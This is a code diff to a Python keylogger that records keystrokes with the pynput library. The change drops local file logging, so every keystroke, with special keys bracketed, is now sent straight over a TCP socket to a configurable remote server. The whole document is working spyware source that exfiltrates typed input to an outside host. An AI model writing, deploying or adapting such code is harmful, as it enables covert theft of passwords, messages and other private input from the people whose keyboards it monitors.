@@ -1,10 +1,8 @@
 from pynput import keyboard
 import socket
 
-log_file = "keystrokes_saved.txt" 
-
-SERVER_IP = '192.168.1.100'  # Replace with your server's IP address
-SERVER_PORT = 9999           # Replace with your server's port
+SERVER_IP = '0.0.0.0' # Replace with your server's IP address
+SERVER_PORT = 1234    # Replace with your server's port
 
 try:
     target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -18,9 +16,11 @@ except Exception as e:
 
 def on_key_press(key):
     try:
-        key_data = f"{key.char}\n" if hasattr(key, 'char') and key.char else f"{key}\n"
-        with open(log_file, 'a') as f: 
-            f.write(key_data) 
+        if hasattr(key, 'char') and key.char is not None:
+            key_data = f"{key.char}\n"
+        else:
+            key_data = f"[{key}]\n"
+ 
         if target_socket:
             target_socket.send(key_data.encode('utf-8'))
     except Exception as e:
